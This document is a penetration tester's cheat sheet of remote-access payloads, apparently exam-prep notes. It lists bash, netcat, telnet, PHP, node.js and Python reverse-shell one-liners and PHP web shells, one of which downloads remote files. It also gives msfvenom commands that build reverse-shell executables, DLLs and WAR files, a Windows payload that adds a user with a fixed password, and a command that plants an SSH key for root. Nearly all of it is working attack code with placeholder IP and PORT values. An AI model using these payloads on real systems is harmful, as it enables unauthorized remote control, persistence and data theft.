# shells

## Python TTY (stabilizing shell)

* For non py-environments, use
    * socat
    * static python binary

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo; fg
<enter> x2
export TERM=xterm-256color
# use stty -a to figure out cols and rows
stty rows <> columns <>
```

## BASH

```bash
echo -e '#!/bin/bash\n\n/bin/bash' > FILE
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
bash -i >& /dev/tcp/IP/PORT 0>&1
nc -e /bin/bash IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP PORT >/tmp/f

0<&196;exec 196<>/dev/tcp/IP/PORT; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/IP/PORT && while read line 0<&5; do $line 2>&5 >&5; done
rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc IP PORt 1>/tmp/backpipe
rm -f backpipe; mknod /tmp/backpipe p && nc IP PORT 0<backpipe | /bin/bash 1>backpipe
```

## Telnet

```bash
mknod a p;telnet IP PORT 0<a | /bin/bash 1>a
rm -f /tmp/p; mknod /tmp/p p && telnet IP PORT 0/tmp/p
```

## PHP

[Image upload bypass](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html)

```bash
# one liner
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'
var = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/IP/PORT 0>&1\'"); ?>';

<?php system("<bash-shell>") ?>
<?php echo system($_GET["cmd"]); ?> || <?php system($_GET['cmd']);?> || <?php exec("whoami"); ?>
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>

<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
    if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents('http://IP/' . $_REQUEST['fupload']));
    };
?>
```

## MSF shells

```bash
-e "x86/shikata_ga_nai"

msfvenom --list payloads | grep <search>

# windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
msfvenom -p windows/adduser USER=kashz PASS=iamr00t123z -f exe -o k_adduser.exe
msfvenom -p windows/exec CMD="" -a x86 --platform Windows -f exe -o k_cmd.exe
msfvenom -p windows/shell_bind_tcp RHOST= LPORT= -f python
# asp
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f asp -o kshell.asp
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f aspx -o kshell.aspx
# dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f dll -o kashz.dll

# linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf -o kshell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f elf -o kshell.elf
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp
# js_le
msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f js_le -e generic/none
# so shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf-so -o utils.so

# jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw -o kshell.jsp
# war
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war -o kshell.war
# nodejs
msfvenom -p nodejs/shell_reverse_tcp LHOST= LPORT=
# perl, cgi
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw -o [.pl | .cgi]
# python
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw -o kshell.py

# meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > kshell.elf

# msf Shell listener
use exploit/multi/handler
show options
```

## node.js

[https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py](https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py)

```bash
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(PORT, "IP", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();

require('child_process').exec('nc -e /bin/sh IP PORT')

var x = global.process.mainModule.require
x('child_process').exec('nc IP PORT -e /bin/bash')
```

## Python reverse-shell

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

import os [OR] __import__('os').system("whoami")
os.system('nc -e "/bin/bash" IP PORT')
os.system("mkdir /root/.ssh; cp /tmp/k/authorized_keys /root/.ssh/")
```

## Static Python Binary

```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/python2.7
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/python2.7.zip

# recursive transfer files to target
wget -r -np -nd -R "index.html*" http://IP/
# set env-vars and run
export PYTHONPATH=$(pwd)/python2.7.zip
export PYTHONHOME=$(pwd)/python2.7.zip
chmod +x python2.7
./python2.7
```